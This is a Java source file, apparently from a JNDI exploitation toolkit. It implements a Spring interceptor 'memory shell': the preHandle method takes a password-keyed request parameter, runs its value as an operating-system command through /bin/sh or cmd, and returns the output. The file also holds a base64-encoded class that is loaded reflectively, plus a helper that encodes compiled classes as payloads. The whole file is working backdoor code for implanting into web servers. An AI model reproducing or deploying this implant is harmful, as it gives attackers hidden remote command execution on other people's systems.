package org.joychou.controller;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;


// C:\repos\JNDIExploit\target\classes>C:\repos\Java\azul-13.0.12\bin\java.exe -cp C:\Users\z004f5td\.m2\repository\org\springframework\spring-context\5.3.18\spring-context-5.3.18.jar;C:\Users\z004f5td\.m2\repository\org\springframework\spring-webmvc\5.3.18\spring-webmvc-5.3.18.jar;C:\Users\z004f5td\.m2\repository\javax\servlet\javax.servlet-api\4.0.1\javax.servlet-api-4.0.1.jar;. com/feihong/ldap/template/DynamicInterceptorTemplate3
@Controller
public class DynamicInterceptorTemplate0 extends HandlerInterceptorAdapter {
    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";

    public DynamicInterceptorTemplate0() {
        this.initialize();
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[+] Dynamic Interceptor0 says hello");
        String k;
        if (request.getParameter("type") != null && request.getParameter("type").equals("basic")) {
            k = request.getParameter(this.basicCmdShellPwd);
            if (k != null && !k.isEmpty()) {
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                response.getWriter().println(result);
                return false;
            }
        }

        return true;
    }

    private void initialize() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

            try {
                this.myClassLoaderClazz = classLoader.loadClass("org.joychou.controller.MyClassLoader");
            } catch (ClassNotFoundException var8) {
                String code = "yv66vgAAADsAWgoAAgADBwAEDAAFAAYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgcACAEAJG9yZy9qb3ljaG91L2NvbnRyb2xsZXIvTXlDbGFzc0xvYWRlcgoABwADCgAHAAsMAAwADQEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsIAA8BAE5DOlxyZXBvc1xKTkRJRXhwbG9pdFx0YXJnZXRcY2xhc3Nlc1xvcmdcam95Y2hvdVxjb250cm9sbGVyXE15Q2xhc3NMb2FkZXIuY2xhc3MHABEBABBqYXZhL2xhbmcvU3RyaW5nCgATABQHABUMABYAFwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwoAGQAaBwAbDAAcAB0BABNqYXZhL25pby9maWxlL0ZpbGVzAQAMcmVhZEFsbEJ5dGVzAQAYKExqYXZhL25pby9maWxlL1BhdGg7KVtCBwAfAQAdamF2YS9pby9GaWxlTm90Rm91bmRFeGNlcHRpb24HACEBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgoAIAAjDAAFACQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uCgAoACkHACoMACsALAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoALgAvBwAwDAAxADIBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsJADQANQcANgwANwA4AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwoAOgA7BwA8DAA9AD4BABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAmTG9yZy9qb3ljaG91L2NvbnRyb2xsZXIvTXlDbGFzc0xvYWRlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBACwoW0JMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwEABWJ5dGVzAQACW0IBAAtjbGFzc0xvYWRlcgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMY2xhc3NDb250ZW50AQABZQEAH0xqYXZhL2lvL0ZpbGVOb3RGb3VuZEV4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAEmJhc2U2NENsYXNzQ29udGVudAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAEgBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhAQAMSW5uZXJDbGFzc2VzAQAHRW5jb2RlcgAhAAcAAgAAAAAAAwAAAAUABgABAD8AAAA6AAIAAgAAAAYqK7cAAbEAAAACAEAAAAAGAAEAAAAJAEEAAAAWAAIAAAAGAEIAQwAAAAAABgBEAEUAAQAJAAwARgABAD8AAABEAAQAAgAAABC7AAdZK7cACSoDKr62AAqwAAAAAgBAAAAABgABAAAADQBBAAAAFgACAAAAEABHAEgAAAAAABAASQBFAAEACQBKAEsAAQA/AAAA1gADAAMAAAA0Eg4DvQAQuAASuAAYTKcAF027ACBZLLcAIr9NuwAgWSy3ACK/uAAnK7YALU2yADMstgA5sQACAAAADQAQAB4AAAANABoAJQADAEAAAAAmAAkAAAATAA0AGAAQABQAEQAVABoAFgAbABcAJAAaACwAGwAzABwAQQAAAD4ABgANAAMATABIAAEAEQAJAE0ATgACABsACQBNAE8AAgAAADQAUABRAAAAJAAQAEwASAABACwACABSAFMAAgBUAAAAEAADUAcAHkkHACX8AAkHAFUAAgBWAAAAAgBXAFgAAAAKAAEALgAoAFkACQ==";
                byte[] bytes = java.util.Base64.getDecoder().decode(code);    // from base64 string to class bytes
//                Method method = null;
//
//                try {
//                    method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//                    method.setAccessible(true);
//                    this.myClassLoaderClazz = (Class)method.invoke(classLoader, bytes, 0, bytes.length);
//                } catch (NoSuchMethodException var7) {
//                    var7.printStackTrace();
//                }

//                this.myClassLoaderClazz = sun.misc.Unsafe.getUnsafe().defineClass("com.feihong.ldap.template.MyClassLoader",bytes, 0, bytes.length );
//                System.out.println("[*] java.lang.invoke.MethodHandles.lookup().defineHiddenClass");
                System.out.println("[*] DynamicInterceptorTemplate0: java.lang.invoke.MethodHandles.lookup().defineClass(bytes);");
//                this.myClassLoaderClazz = java.lang.invoke.MethodHandles.lookup().defineClass(bytes);
                MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.lookup();
                Method method = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                this.myClassLoaderClazz = (Class) method.invoke(lookup, bytes);
//                java.lang.invoke.MethodHandles.lookup().defineHiddenClass(bytes, true, java.lang.invoke.MethodHandles.Lookup.ClassOption.NESTMATE);
                // ref: https://stackoverflow.com/questions/66974846/java-lang-exceptionininitializererror-with-java-16-j-l-classformaterror-access/67006749#67006749
            }
        } catch (IllegalAccessException | NoSuchMethodException | InvocationTargetException var9) {
            var9.printStackTrace();
        }

    }

    public static void main(String[] args) {
        byte[] classContent;
        try {
            classContent = Files.readAllBytes(Paths.get("C:\\repos\\JNDIExploit\\target\\classes\\org\\joychou\\controller\\DynamicInterceptorTemplate0.class"));
        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        String base64ClassContent = java.util.Base64.getEncoder().encodeToString(classContent);   // from class content to base64 string.
        System.out.println(base64ClassContent);
    }
}